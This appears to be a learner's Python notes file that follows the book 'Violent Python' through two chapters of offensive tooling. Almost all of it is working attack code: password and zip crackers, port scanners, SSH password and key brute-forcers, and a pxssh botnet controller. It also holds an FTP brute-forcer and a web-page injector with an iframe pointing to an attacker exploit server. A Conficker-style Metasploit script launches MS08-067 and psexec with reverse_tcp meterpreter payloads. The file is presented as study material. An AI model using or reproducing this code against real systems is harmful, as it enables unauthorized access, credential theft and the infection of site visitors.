#####################################################################
# Chapter 1
#####################################################################

import os
import nmap
import time
import crypt
import ftplib
import pexpect
import zipfile
import optparse
from socket import *
from threading import *
from pexpect import pxssh


def banner_and_service_example():
    port = 21
    banner = "FreeFloat FTP Server"
    print("[+] Checking for "+banner+" on port " + str(port))

    # Don't forget about the list.index function

    # Reserved names for some ports
    services = {
        'ftp': 21, 'ssh': 22, 'smtp': 25,
        'http': 80
    }


def socket_example(ip, port):
    # This piece of code will time out, but you get the idea

    try:
        socket.setdefaulttimeout(2)
        s = socket.socket()
        s.connect((ip, port))
        banner = s.recv(1024)
        return banner

    except Exception as e:
        print("Error = " + str(e))


def check_vuls(banner):
    with open("vul_banners.txt", "r") as f:
        for line in f.readlines():
            if line.strip("\n") in banner:
                print("Server is vulnerable: " + banner.strip("\n"))


def socket_checker():
    port_list = [21, 22, 25, 80, 110, 443]
    for x in range(1, 255):
        ip = '192.168.95.' + str(x)

        for port in port_list:
            banner = socket_example(ip, port)
            if banner:
                check_vuls(banner)

# We can use a for loop to iterate through an entire subnet of
# IP addresses for 192.168.95.1 through 192.168.95.254.
# Now let's rewrite the socket_example to check all 254 IP addresses
# with ports for telnet, SSH, smtp, http, imap, and https services.

# Useful os module functions: os.path.isfile, os.access, etc...
# print(crypt.crypt("egg", "HX"))

# We will now write a program which reads from a passwords.txt file
# and outputs the encrypted pasword, and it checks the encryption against
# the dictionary file.


def test_pass(crypted_pass):
    # removing the salt from encrypted (first two letters)
    salt = crypted_pass[0:2]
    with open("dictionary.txt", "r") as file:
        for word in file.readlines():
            word = word.strip("\n")
            crypt_word = crypt.crypt(word, salt)

            if crypt_word == crypted_pass:
                print("Found the password")
                return

    print("Password not found.")
    return


def main_func():
    with open("passwords.txt") as f:
        for line in f.readlines():
            if ":" in line:
                crypt_pass = line.split(':')[1].strip(" ")
                test_pass(crypt_pass)

# On *Nix based OS's, the /etc/shadow file stores hashed passwords.
# Challenge: update the script to crack SHA-512 hashes


def test_sha(cryptPass):
    salt = cryptPass[0:11]
    print("[+] Salt: " + salt)
    dictFile = open('dictionary.txt', 'r')
    for word in dictFile.readlines():
        word = word.strip('\n')
        cryptword = crypt.crypt(word, salt)
        print("[+] Hash value: " + cryptword)
        if (cryptword == cryptPass):
            print("[+] Found password: "+word+"\n")
            return
    print("[-] Password not found.\n")
    return


def main_sha():
    passfile = open('passwords.txt')
    for line in passfile.readlines():
        if ":" in line:
            user = line.split(':')[0]
            cryptPass = line.split(':')[1].strip(' ')
            print("[*] Cracking password for: "+user)
            test_sha(cryptPass)

# Now we will write a zip file password cracker.


def extract_file(zip_file, password):
    try:
        zip_file.extractall(pwd=password.encode('utf-8'))
        print("password is {}".format(password))
    except Exception as e:
        pass


def main_zip():
    parser = optparse.OptionParser("usage%prog " +
                                   "-f <zipfile> -d <dictionary>")
    parser.add_option('-f', dest='zname', type='string',
                      help='specify zip file')
    parser.add_option('-d', dest='dname', type='string',
                      help='specify dictionary file')
    options, args = parser.parse_args()

    if (options.zname == None) | (options.dname == None):
        print(parser.usage)
        exit(0)
    else:
        zname = options.zname
        dname = options.dname

    zip_file = zipfile.ZipFile(zname)
    pass_file = open(dname)

    for line in pass_file.readlines():
        password = line.strip("\n")
        t = Thread(target=extract_file, args=(zip_file, password))
        t.start()

    pass_file.close()

#####################################################################
# Chapter 2
#####################################################################

# Check the system and its vulnerabilities before choosing exploits.
# Now, we'll scan target hosts for open TCP ports. Most applications
# use TCP (TCP: 80, email: 25, FTP: 21, ...). To connect to any of
# these we need the IP address and the service port. We need to
# port scan! We can send TCP SYN packet and wait for responses,
# signalling an open port (is this called a ping?). Another form
# of this is a full 3-way handshake. We will choose to write the latter.


def handshake():
    parser = optparse.OptionParser(
        'usage %prog –H' + '<target host> -p <target port>')

    parser.add_option('-H', dest='tgtHost', type='string',
                      help='specify target host')
    parser.add_option('-p', dest='tgtPort', type='string',
                      help='specify target port(s), seperated by commas')

    options, _ = parser.parse_args()
    tgtHost = options.tgtHost
    tgtPorts = str(options.tgtPort).split(', ')

    if (tgtHost == None) | (tgtPorts[0] == None):
        print(parser.usage)
        return

    port_scan(tgtHost, tgtPorts)


screenLock = Semaphore(value=1)


def conn_scan(host, port):
    try:
        conn_sock = socket(AF_INET, SOCK_STREAM)
        conn_sock.connect((host, port))

        # After connection, we know that a port is open, so we can send some data
        # and wait for a response
        conn_sock.send(b'Violent Python')
        results = conn_sock.recv(100)

        screenLock.acquire()
        print("tcp open in port {}".format(port))
        print("Got some results AKA " + str(results))

    except Exception as e:
        screenLock.acquire()
        print(e)

    finally:
        screenLock.release()
        conn_sock.close()


def port_scan(host, ports):
    try:
        target_ip = gethostbyname(host)
    except:
        print("Cannot resolve unknown host")
        return

    try:
        target_name = gethostbyaddr(target_ip)
        print('\n[+] Scan Results for: ' + target_name[0])
    except:
        print('\n[+] Scan Results for: ' + target_ip)

    setdefaulttimeout(1)
    for port in ports:
        t = Thread(target=conn_scan, args=(host, int(port)))
        t.start()

# The scanning of sockets should be done in a threaded manner, which is super simple
# using the threading module as you've done before. However, there's a disadvantage:
#         t = Thread(target=conn_scan, args=(host, int(port)))
#         t.start()
# Simply doing this will jumble up execution order. Imagine if you're outputting
# something to the terminal - disaster!!
# Use semaphores to rescue you from this situation.

# Although the above example was fun to work though, it is limited in the sense that
# it only uses handshake scanning, while you may very well want to use others as well.
# Enter, nmap-python.


def nmap_scan(host, port):
    nm = nmap.PortScanner()
    nm.scan(host, port)
    state = nm[host]['tcp'][int(port)]['state']
    return state

# Let's try to create our own SSH worm. We will use the Pexpect moduel, which can be
# used to monitor and interact with programs, making it a good choice to work with
# SSH consoles.


PROMPT = ['#', '>>>', '>', '\$']
max_connections = 5
connection_lock = BoundedSemaphore(value=max_connections)
found = False
fails = 0


def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)


def connect(user, host, password, release):
    # If you wanna use a global variable in a functional scope instead of creating a local
    # copy of the same, use the global keyword. Pylance linting will also show you if
    # you're not using any particular variable nicely (if you're only updating the variable
    # in the function).

    global found
    global fails

    try:
        s = pexpect.pxssh()
        s.login(host, user, password)
        print("Password found!")
        found = True

    # How to handle multiple exceptions!
    except Exception as e:
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)

            # Recursively call again after sleeping for 5 seconds
            connect(user, host, password, False)

        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(user, host, password, False)

        else:
            print(str(e))

    finally:
        if release:
            connection_lock.release()


# Python pro tip: if you wanna break up function calls
# or long print statements up, use one of '\' these
# bad boys and move along.
def ssh_main():
    parser = optparse.OptionParser('usage%prog ' +
                                   '-H <target host> -u <user> -F <password list>')

    parser.add_option('-H', dest='tgtHost', type='string', help='target host')
    parser.add_option('-u', dest='tgtUser', type='string', help='target user')
    parser.add_option('-F', dest='passwordFile',
                      type='string', help='password file')

    options, _ = parser.parse_args()
    tgtHost, tgtUser, passwordFile = options.tgtHost, options.tgtUser, options.passwordFile

    if tgtHost == None or tgtUser == None or passwordFile == None:
        print(parser.usage)
        return

    with open(passwordFile, 'r') as pass_file:
        for line in pass_file.readlines():
            if found:
                return
            if fails > 5:
                print("Too many timeouts!")
                return

            connection_lock.acquire()
            password = line.strip("\n").strip("\r")
            print("Testing password " + password)
            t = Thread(target=connect, args=(tgtHost, tgtUser,
                                             password, True))
            _ = t.start()


# SSH can also be done with public key cryptography, which is more complex than the
# simple UNIX passwords seen earlier. Let's try to create a SSH key breaker.

stop = False


def connect_key(user, host, keyfile, release):
    global fails
    global stop

    try:
        perm_denied = "permission denied"
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = '-o PasswordAuthentication=no'
        connection_string = f"ssh {user}@{host} –i {keyfile} {opt}"
        child = pexpect.spawn(connection_string)

        ret = child.expect([pexpect.TIMEOUT, perm_denied,
                            ssh_newkey, conn_closed, '$', '#', ])

        if ret == 2:
            print('[-] Adding Host to ∼/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)

        elif ret == 3:
            print('[-] Connection Closed By Remote Host')
            fails += 1

        elif ret > 3:
            print("[+] Success " + str(keyfile))
            stop = True

    finally:
        if release:
            connection_lock.release()


def key_main():
    parser = optparse.OptionParser('usage%prog -H ' +
                                   '<target host> -u <user> -d <directory>')
    parser.add_option('-H', dest='tgtHost', type='string',
                      help='specify target host')
    parser.add_option('-d', dest='passDir', type='string',
                      help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string',
                      help='specify the user')
    options, _ = parser.parse_args()
    host = options.tgtHost
    passDir = options.passDir
    user = options.user

    if host == None or passDir == None or user == None:
        print(parser.usage)
        return

    for filename in os.listdir(passDir):
        if stop:
            print("Key found!")
            return

        if fails > 5:
            print("Too many closed connections!")
            return

        connection_lock.acquire()
        fullpath = os.path.join(filename, passDir)
        print("Testing keyfile: " + str(fullpath))
        t = Thread(target=connect_key, args=(user, host, fullpath, True))
        _ = t.start()


# This is one remote host (or a computer) we just broke into. Malicious attackers
# often use pools of such broken computers, also called a botnet for, well,
# malicious purposes.

class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(str(e))

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


def add_client(host, user, password):
    bot_net.append(Client(host, user, password))


def botnet_command(command):
    for client in bot_net:
        output = client.send_command(command)
        print("Output from {}".format(client.host))
        print("Output: {}".format(output))


bot_net = []
# add_client('10.10.10.110', 'root', 'toor')
# add_client('10.10.10.120', 'root', 'toor')
# add_client('10.10.10.130', 'root', 'toor')
# botnet_command('uname -v')
# botnet_command('cat /etc/issue')

# This script is attacking servers directly, but there are other ways to go about it as well.
# For example, let's study the k985ytv attack, which a botnet to inject JavaScript and
# redirect people who visit a site to download anti-virus software which stole credit card
# information. How can you do this using python?

# Before we go forward, let's talk more about FTP (file transfer protocol). You can use
# the ftplib module to determine if any service offers anonymous FTP.


def anonymous_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'random@random.com')
        print("Sucess with host: " + str(hostname))
        ftp.quit()
        return True
    except Exception as e:
        print("Unsuccessful with host: " + str(hostname))
        return False


# host = '192.168.95.179'
# anonymous_login(host)

# If you really wanna get in, and the host doesn't enable anonymous login, you can
# brute force credentials, which attackers have been quite successful with in the
# past.


def brute_login(hostname, password_file):
    file = open(password_file, 'r')
    for line in file.readlines():
        username = line.split(":")[0]
        password = line.split(":")[1].strip('r').strip('\n')
        print("Trying {}:{}".format(username, password))

        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print("[+] Login succeeded!")
            ftp.quit()
            return (username, password)

        except:
            pass

    print("Couldn't find a username:password combination")
    return (None, None)


host = '192.168.95.179'
passwdFile = 'ftp_pass.txt'

# Once we have valid FTP credentials, it is good to know if server provides web service
# (for the JS injection). On a server, the NLST command spits out a list of files, which
# we can take advantage of.


def check_ftp_webpages(ftp):
    try:
        dirlist = ftp.nlst()
    except:
        print("Couldn't find any directories :(")
        return

    pages = []
    for file in dirlist:
        fn = file.lower()

        if '.php' in fn or '.html' in fn or '.asp' in fn:
            pages.append(file)

    return pages

# Now that we have the pages, we can start injecting our own client side code to it!
# Create a malicious server and page (MetaSploit is a good framework). Victims who
# visit this page will be redirected and we'll receive a callback, through which we
# can inject our JS. If connected, there'll be a reverse TCP shell created, and through
# this shell, we'll execute commands as the administrator of the infected client.
# The next step is simple: download the file, add whatever you want, and reupload the file.


def fpt_injector(ftp, page, redirect):
    file = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, file.write)
    file.write(redirect)
    file.close()
    ftp.storlines('STOR ' + page, open(page + '.tmp'))

# After the login and checking functions used earlier, call the injector by
# redirect = '<iframe src='+\
#   '"http://10.10.10.112:8080/exploit"></iframe>'
# fpt_injector(ftp, 'index.html', redirect)
#
# which just redirects the main page to our malicious server, through which we gain
# administrative access to that victim.


def attack(username, password, tgtHost, redirect):
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defPages = check_ftp_webpages(ftp)
    for defPage in defPages:
        fpt_injector(ftp, defPage, redirect)

# The k985ytv was just all this code (with the addition of trying anonymous access first, and
# if that fails, try the brute force version). In under 100 lines of python code, this
# interesting attack can be set up. Incredible.

# The next attack discuss in the book compromised over 5 million workstations in 200 countries!
# A simple python script which repeats the process of scanning for an open port and creating a
# Metasploit config file to attack the host.

# Searches for all hosts within a subnet


def find_targets(subnet):
    nm_scan = nmap.PortScanner()
    nm_scan.scan(subnet, '445')
    target_hosts = []

    for host in nm_scan.all_hosts():
        if nm_scan[host].has_tcp(445):
            state = nm_scan[host]['tcp'][445]['state']

            if state == 'open':
                print("[+] Found target host")
                target_hosts.append(host)

    return target_hosts


# We can use MetaSploit's Meterpreter to analyze the infected target.
# We have to setup a listener function, which will do the following:

def setup_handler(config_file, lhost, lport):
    config_file.write('use exploit/multi/handler\n')
    config_file.write('set PAYLOAD ' +
                      'windows/meterpreter/reverse_tcp\n')
    config_file.write('set LPORT ' + str(lport) + '\n')
    config_file.write('set LHOST ' + lhost + '\n')
    config_file.write('exploit -j -z\n')
    config_file.write('setg DisablePayloadHandler 1\n')


def confickerExploit(configFile, tgtHost, lhost, lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set payload ' +
                     'windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')

# Although this exploit has been successful in the past, we have created
# security patches which will handle this easily. This is why the
# conflicker worm used another attack vector in conjunction.
# 1. Brute force SMB username/passwords
# 2. Get access to remotely executed processes (psexec)
# 3. If success, launch Meterpreter back to the local address and port


def smb_brute(config_file, target_host, password_file, lhost, lport):
    username = 'Administrator'
    pf = open(password_file, 'r')

    for password in pf.readlines():
        password = password.strip('\n').strip('\r')
        config_file.write('use exploit/windows/smb/psexec\n')
        config_file.write('set SMBUser ' + str(username) + '\n')
        config_file.write('set SMBPass ' + str(password) + '\n')
        config_file.write('set RHOST ' + str(target_host) + '\n')
        config_file.write('set PAYLOAD ' +
                          'windows/meterpreter/reverse_tcp\n')
        config_file.write('set LPORT ' + str(lport) + '\n')
        config_file.write('set LHOST ' + lhost + '\n')
        config_file.write('exploit -j -z\n')


def conflicker_main():
    config = open('meta.rc', 'w')
    parser = optparse.OptionParser('[-] Usage%prog ' +
                                   '-H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
    parser.add_option('-H', dest='tgtHost', type='string',
                      help='specify the target address[es]')
    parser.add_option('-p', dest='lport', type='string',
                      help='specify the listen port')
    parser.add_option('-l', dest='lhost', type='string',
                      help='specify the listen address')
    parser.add_option('-F', dest='passwdFile', type='string',
                      help='password file for SMB brute force attempt')
    (options, _) = parser.parse_args()

    if (options.tgtHost == None) | (options.lhost == None):
        print(parser.usage)
        exit(0)

    lhost = options.lhost
    lport = options.lport
    if lport == None:
        lport = '1337'

    password_file = options.passwdFile
    tgtHosts = find_targets(options.tgtHost)
    setup_handler(config, lhost, lport)
    for tgtHost in tgtHosts:
        confickerExploit(config, tgtHost, lhost, lport)

        if password_file != None:
            smb_brute(config, tgtHost, password_file, lhost, lport)

    config.close()
    os.system('msfconsole -r meta.rc')

# Buffer overflow attacks

# These work by overwriting the next pointers of user input fields. Some essential aspects of a stack based
# buffer overflow attack:
# 1. Overflow: input which exceeds he expected value in the stack
# 2. Return address: 4 byte address used to jump directly on top of the stack
# 3. Padding: A series of NOP (no operation) instructions, which allows the attacker to guesstimate the
#    next address to jump on.
# 4. Shellcode: a piece of code written in Assembly, which can be generated from MetaSpoit

# The idea is to connect to a port using sockets, authenticate to the host, and then send in the crash
# variable.


def buffer_attack(target, command, crash):
    """ Above all this code exists some other code (including the padding, return, overflow, etc), which
    hasn't been included here. Check out the book for more precise details. """

    s = socket(AF_INET, SOCK_STREAM)
    try:
        s.connect((target, 21))
    except:
        exit(0)

    s.send("USER anonymous\r\n")
    s.recv(1024)
    s.send("PASS \r\n")
    s.recv(1024)
    s.send(command + " " + crash + "\r\n")
    time.sleep(4)

#####################################################################
# Chapter 3
#####################################################################
